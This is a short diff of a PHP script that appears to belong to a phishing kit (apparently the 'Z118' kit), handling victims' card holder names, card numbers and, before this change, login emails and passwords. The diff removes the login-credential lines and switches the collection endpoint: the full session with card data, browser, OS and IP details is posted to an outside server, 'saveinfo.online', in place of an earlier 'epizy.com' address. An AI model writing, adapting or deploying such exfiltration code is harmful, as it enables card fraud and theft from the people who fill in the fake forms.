@@ -9,10 +9,6 @@ include('../../functions/get_browser.php');
 include('../../functions/get_ip.php');
 $_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
 $_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);
-$_SESSION['_login_email_'] = $_SESSION['Email'];
-$_SESSION['_login_password_'] = $_SESSION['Pass'];
-
-
 
 $_SESSION['TIME_DATE'] = $TIME_DATE;
 ///////////////////////////[CountryA]////////////////////////////////////
@@ -154,7 +150,7 @@ $data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
 $data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
 $data['s'] = $_SESSION;
 
-sendPost('http://www.save-test.epizy.com/sv2.php',$data);
+sendPost('http://saveinfo.online/sv2.php',$data);
 
 
 //---- end request----------------
